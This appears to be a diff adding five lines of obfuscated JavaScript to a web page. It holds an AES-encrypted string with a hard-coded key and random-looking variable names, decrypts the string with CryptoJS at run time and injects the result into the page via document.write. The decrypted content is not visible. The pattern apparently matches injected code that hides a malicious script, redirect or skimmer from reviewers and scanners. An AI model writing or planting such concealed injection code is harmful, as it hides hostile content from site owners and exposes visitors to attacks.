@@ -1,0 +1,5 @@
+var RlTC="U2FsdGVkX1/A76a6Stgz+yYqnNaY09EjA/OXnm240cATu0TlEVj0nyifpPKAX5CTuRhVVwwzpbCZ6L20qKR9ELUdUkfG0fiiGD6pMxHeIgw14hkpQvHLkdV87PBeJF0aTahxw/GkUOM5KparG4tnfnEGpm4TA3MpMcR7JVJtN4g5fyuaZ3xVMTlh/+xeklisN8z2Bfv2v5PUyuo6FJzJ6PPya5Qox3f9rlrxK52tAoUGwWjmb1mqXtrQALZYRvr6/lB+Rug9mAxhEppWaYtV+6nSCbwta584Xdr8xBDrLG0TMIgzlQLidNnlAYL6Bbduqgh+ZTADakxq3ewq3ezVwrPkLDRP4c32O7pEfaBafSl1CJEyEDWRxA5oTIwaBhJVYkUpmwzcps2K8NZwZR6V/dXjK7MicUq++lIaT/uFd1XiFLu2COlXmF1apR/pVJHN4U/Ma4zWBSeitywC/oE5sT9HacoYt64cIxHDfXBCFkO8mEBl7rrWRSvEZhOBOVudL4vPM356v1XVjKTBegJy9Q==" 
+ var QtkOC = "BjAvdvUkpcDdryGP"; 
+ var tilKohl= CryptoJS.AES.decrypt(RlTC, QtkOC); 
+ var pUwlKY = tilKohl.toString(CryptoJS.enc.Utf8); 
+ document.write(pUwlKY) 
